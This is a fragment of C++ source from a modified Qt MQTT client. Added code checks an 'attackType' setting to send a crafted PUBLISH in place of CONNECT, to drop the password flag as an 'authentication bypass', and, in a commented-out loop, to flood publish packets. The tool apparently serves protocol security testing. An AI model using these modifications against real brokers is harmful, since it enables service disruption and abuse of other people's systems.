...
bool QMqttConnection::sendControlConnect() //'attackType' Added by Faisal
{
    qCDebug(lcMqttConnection) << Q_FUNC_INFO;

    //QMqttControlPacket packet2(QMqttControlPacket::CONNECT);
    //====== Added by Faisal =============

    QMqttControlPacket packet;
    if (m_clientPrivate->m_attackType == "MQTT Crafted Packet")
    {
        QMqttControlPacket packet2(QMqttControlPacket::PUBLISH);
        packet =packet2;
    }
    else
    {
    ...
    if (m_clientPrivate->m_password.size())
        if(m_clientPrivate->m_attackType !="MQTT Authentication Bypass")
           flags |= 1 << 6;
...
qint32 QMqttConnection::sendControlPublish(const QMqttTopicName &topic, const QByteArray &message, quint8 qos, bool retain)
{
    ...
    packet->append(topic.name().toUtf8(),m_clientPrivate->m_attackType);
    ...
    /* if(m_clientPrivate->m_attackType !="MQTT Publish Flood")
     {
         m_clientPrivate->m_publish_packet_per_sec = 50;
         for(int k=0;k<m_clientPrivate->m_publish_packet_per_sec;k++)
            writePacketToTransport(*packet.data());
     }*/
